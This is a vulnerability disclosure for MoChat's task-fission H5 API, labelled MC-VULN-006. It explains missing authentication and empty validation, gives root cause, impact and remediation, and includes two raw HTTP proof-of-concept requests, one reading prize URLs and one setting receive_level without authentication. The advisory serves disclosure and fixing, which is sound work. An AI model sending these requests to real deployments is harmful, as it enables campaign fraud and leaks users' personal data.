# MoChat — 任务宝 H5 接口未鉴权读写 (MC-VULN-006)

| Field | Value |
|-------|-------|
| **Vendor** | mochat-cloud |
| **Product** | MoChat |
| **Version** | master（Hyperf 2.2） |
| **Type** | Missing Authentication for Critical Function |
| **CWE** | CWE-306 / CWE-639 |
| **Authentication** | None |

## Summary

`/operation/workFission/taskData` leaks campaign prizes; `PUT /operation/workFission/receive` updates `receive_level` with empty validation.

## Root cause

Operation Action classes lack any `@Middleware`; `Receive::rules()` returns `[]`.

## Proof of Concept (Yakit)

Full packets: [`../poc/MC-VULN-006-YAKIT-完整请求包.md`](../poc/MC-VULN-006-YAKIT-完整请求包.md)  
（仓库内亦可看 [`../poc/MC-VULN-006/YAKIT-PoC.md`](../poc/MC-VULN-006/YAKIT-PoC.md)）

### 1) Unauthenticated read — task / prize URL

```http
GET /operation/workFission/taskData?union_id=union_poc_test&fission_id=1 HTTP/1.1
Host: 127.0.0.1:9501
Accept: application/json
Connection: close


```

**Expected:** `code=200`, `data.task[].gift_url` present

![PoC-1 taskData](./screenshots/MC-VULN-006-01-taskData.png)

### 2) Unauthenticated write — receive_level

```http
PUT /operation/workFission/receive HTTP/1.1
Host: 127.0.0.1:9501
Content-Type: application/json
Accept: application/json
Connection: close

{"union_id":"union_poc_test","level":5}
```

**Expected:** `{"code":200,...}`；DB `mc_work_fission_contact.receive_level` updated

![PoC-2 receive](./screenshots/MC-VULN-006-02-receive.png)

![PoC-3 DB evidence](./screenshots/MC-VULN-006-03-db-receive-level.png)

## Impact

Campaign fraud, PII leak (nicknames/avatars via inviteFriends), prize URL disclosure.

## Remediation

H5 session/signed token; validate union_id ownership; server-side level checks.

## References

- Audit: `SECURITY_AUDIT_REPORT.md` §MC-VULN-006
- PoC: `POC_VERIFICATION_REPORT.md`
- Yakit: `poc/MC-VULN-006-YAKIT-完整请求包.md`
